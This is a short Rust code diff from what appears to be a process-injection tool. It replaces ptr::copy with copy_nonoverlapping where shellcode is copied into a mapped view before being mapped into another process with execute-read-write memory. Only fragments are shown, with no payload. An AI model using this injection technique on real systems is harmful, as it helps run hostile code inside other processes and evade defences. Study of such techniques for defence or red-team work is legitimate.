@@ -1,6 +1,6 @@
 use std::{
     mem::transmute,
-    ptr::{copy, null},
+    ptr::{copy_nonoverlapping, null},
 };
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::{
@@ -89,7 +89,7 @@ fn main() {
         );
 
         println!("[+] Copying Shellcode to another process");
-        copy(shellcode.as_ptr() as _, map_address.Value, shellcode.len());
+        copy_nonoverlapping(shellcode.as_ptr() as _, map_address.Value, shellcode.len());
 
         let p_map_address = MapViewOfFileNuma2(hfile, hprocess, 0, None, 0, 0, PAGE_EXECUTE_READWRITE.0, 0);
 
